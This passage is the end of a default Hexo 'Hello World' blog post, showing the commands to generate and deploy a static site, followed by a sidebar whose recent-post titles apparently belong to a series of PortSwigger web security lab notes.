<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2026/01/05/hello-world/" data-id="cmkbf3udu0001ewvs2btvctq1" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/portswigger/">portswigger</a></li></ul>
    </div>
  </div>


  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/02/">February 2026</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/01/">January 2026</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2026/02/02/Access%20control%20vulnerabilities%20and%20privilege%20escalation/">7.Access control vulnerabilities and privilege escalation</a>
          </li>
        
          <li>
            <a href="/2026/01/25/Information%20disclosure/">6.Information disclosure</a>
          </li>
        
          <li>
            <a href="/2026/01/23/API%20testing/">5.API testing</a>
          </li>
        
          <li>
            <a href="/2026/01/22/Business%20logic%20vulnerabilities/">4.Business logic vulnerabilities</a>
          </li>
        
          <li>
            <a href="/2026/01/19/Server-side%20request%20forgery%20(SSRF)/">3.Server-side request forgery (SSRF)</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2026 hr1sto<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>